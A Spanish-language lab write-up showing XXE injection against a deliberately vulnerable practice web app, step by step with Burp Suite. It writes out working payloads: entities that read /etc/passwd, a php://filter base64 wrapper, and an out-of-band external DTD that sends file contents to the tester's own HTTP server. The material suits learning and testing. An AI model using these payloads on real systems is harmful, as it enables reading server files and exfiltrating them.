# XXE Laboratorio 💻


<p align="center">
    <img src=/assets/XXE/Laboratory/banner_laboratory.PNG>
</p>

El Laboratorio que use es: [🐱 Github XEE](https://github.com/jbarone/xxelab).

---
---

La página inicial del **sitio web vulnerable** es esta

<p align="center">
    <img src=/assets/XXE/Laboratory/01-Web.PNG>
</p>

* Si seguimos los pasos para desplegar el laboratorio, la URL es `localhost:5000`

---

Usaremos `Burp Suite` para inteceptar la petición que se realiza la momento de **crear unas cuenta**

<p align="center">
    <img src=/assets/XXE/Laboratory/02-Petition.PNG>
</p>

* Vemos que la **data** viaja al servidor web en formato XML.
* Cuando tenemos este tipo de situaciones lo primero que debemos testear es un `ataque XXE`


## Inyectando entidades en XML 👥

Para esto tendremos que incluir la siguiente línea de código

```
<!DOCTYPE evil [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

<p align="center">
    <img src=/assets/XXE/Laboratory/03-DTD.PNG>
</p>

* **(1)**: `!DOCTYPE` se usa para indicar que usaremos un `DTD`(Document Type Definition) con el nombre `evil`
  
* **(2)**: `!ENTITY xxe SYSTEM` indica que crearemos una entidad con el nombre `xxe`. `SYSTEM` se usa para especificar que al entidad está definida en un archivo o recurso externo al documento actual.
  
* **(3)** `file://` Es un wrapper usado para acceder a un archivo dentro de la máquina víctima. `/etc/passwd` Es un archivo de Linux en el que se ven todos los usuarios del sistema, que tipo de consola tienen y demás características.

Para usar nuestra entidad, tenemos que seguir la siguiente sintaxis `&<NombreEntidad>;`

---

Al momento de enviar nuestra petición al servidor web nos indicará lo siguiente

<p align="center">
    <img src=/assets/XXE/Laboratory/04-Request.PNG>
</p>

* `estx@estx.com` Es el correo que indiqué para **Crear una cuenta**.

El campo `<email>` es el campo vulnerable, ya que a pesar de intentar con otros correos electrónicos no nos dejará crear un cuenta. Además, este es el único campo del cuando vemos algo en la respuesta del servidor web

Ahora, en vez de enviar un correo, usaremos nuestra entidad previamente creada

<p align="center">
    <img src=/assets/XXE/Laboratory/05-Script.PNG>
</p>

* Recibimos como **respuesta del servidor** el contenido del archivo `/etc/passwd` de la máquina víctima. ✅
  
---
Podemos usar diferentes tipos de `wrappers` para recibir la información solicitada en un formato diferente. En este caso recibimos el contenido del **archivo /etc/passwd** en texto plano, pero, puede ser muy feo de ver en una respuesta del servidor.

Por lo cual ahora usaremos el wrapper `php://filter/convert.base64-encode/resource=/etc/passwd`

<p align="center">
    <img src=/assets/XXE/Laboratory/06-base64.PNG>
</p>

* Para representar la data original lo podemos hacer con `Burp Suite` y su submenú `Decoder` o con el siguiente comando en Linux `echo "<Data en Base64>" | base64 -d; echo`

---
---

## Inyectando entidades en XML OOB (Out Of Band) Blind 🦮

En algunas situaciones no se nos permitirá **inyectar entidades** en la data XML que enviemos al servidor. En estos casos, podemos cargar un `dtd` externo.

```xml
<!DOCTYPE evil [<!ENTITY % external SYSTEM "http://<IP>/<Archivo.dtd>"> %external;]>
```

* `% external` y `%external;` Esta sintaxis nos permite llamar a la entidad en la misma línea en la que las declaramos.


Para comprobar que la `entidad` definida previamente funciona haremos esto:

1. Levantaremos un servidor `http` con Python
    ```python
    python -m http.server 80
    ```
    * El puerto puede ser cualquiera que no se encuentre ejecutando un servicio previamente.

2. En la petición de `Burp Suite` incluiremos el `dtd` previo

<p align="center">
    <img src=/assets/XXE/Laboratory/07-OOB.PNG>
</p>    

* Mi dirección IP es la `192.168.100.70`, cuando se realiza una petición a un servicio web y no se especifica un puerto, por defecto es el `80`.
* En caso de que hayamos montado el **servidor HTTP** en un puerto diferente lo indicamos así `<Dirección IP>:<Puerto>`
* `file` Es el archivo que definiremos posteriormente para que se carguen de ahí los `dtds`
* En `Respuesta` nos vemos nada, pero si observamos el servidor HTTP

<p align="center">
    <img src=/assets/XXE/Laboratory/08-Log.PNG>
</p>

---

Ahora crearemos el archivo que almacenará las `dtds` maliciosas.

<p align="center">
    <img src=/assets/XXE/Laboratory/09-OOB.PNG>
</p>

* En la primera línea definimos la `dtd` que solicitará el contenido de un archivo de la máquina víctima.
  
* `&#x25;` Es la representación de `%`, está codificado ya que estamos definiendo una entidad dentro de otra, por lo que el `%` se lo representa de una forma especial.
  
* `http://<IP>/?content=%file;` Aquí definimos a donde queremos que nos envíe la información de lo solicitado. En este caso la información nos llegará al **servidor HTTP**, en forma de `http://<IP>/?content=<Contenido en base64>`, `%file;` es la 'variable' que contendrá esa información en base64.

* Por último invocamos las **entidades definidas previamente**. (Solo se invocan 2, ya que con `%file;` invocamos la primera `dtd`)

* No debemos tener entidades definidas con los mismos nombres. ⚠

---

Con `Burp Suite` enviamos la solicitud

<p align="center">
    <img src=/assets/XXE/Laboratory/10-Request.PNG>
</p>

Y como respuesta en nuestro servidor HTTP tenemos

<p align="center">
    <img src=/assets/XXE/Laboratory/11-Data.PNG>
</p>

Recibimos data en base64 y aplicando el comando `echo "<Data en base64>" | base64 -d; echo` podemos ver la data original.

<p align="center">
    <img src=/assets/XXE/Laboratory/12-Original.PNG>
</p>